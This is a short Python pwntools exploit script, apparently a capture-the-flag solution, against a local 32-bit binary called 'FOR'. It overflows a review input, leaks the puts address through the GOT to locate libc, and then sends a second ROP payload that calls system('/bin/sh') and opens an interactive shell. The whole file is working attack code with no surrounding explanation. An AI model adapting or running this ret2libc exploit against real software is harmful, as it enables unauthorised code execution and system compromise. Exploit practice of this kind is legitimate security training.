#!/usr/bin/env python
# coding: utf-8

from pwn import *

pr = 0x08048379
writeReview = 0x080484EB

def main():
    e = ELF('./FOR')
    libc = e.libc
    p = process(e.path)

    p.recvuntil('Review : ')

    payload = "A" * 0x6c
    payload += "BBBB"
    payload += p32(e.plt['puts'])
    payload += p32(pr)
    payload += p32(e.got['puts'])
    payload += p32(writeReview)

    p.sendline(payload)

    puts_got = u32(p.recv(4))
    libcbase = puts_got - libc.symbols['puts']
    system = libcbase + libc.symbols['system']
    binsh = libcbase + libc.search("/bin/sh\x00").next()

    log.success("puts@got : {0}".format(hex(puts_got)))
    log.success("LIBC base : {0}".format(hex(libcbase)))
    log.success("system : {0}".format(hex(system)))
    log.success("&/bin/sh : {0}".format(hex(binsh)))

    payload = "A" * 0x6c
    payload += "BBBB"
    payload += p32(system)
    payload += p32(pr)
    payload += p32(binsh)

    p.recv(1024)
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    main()
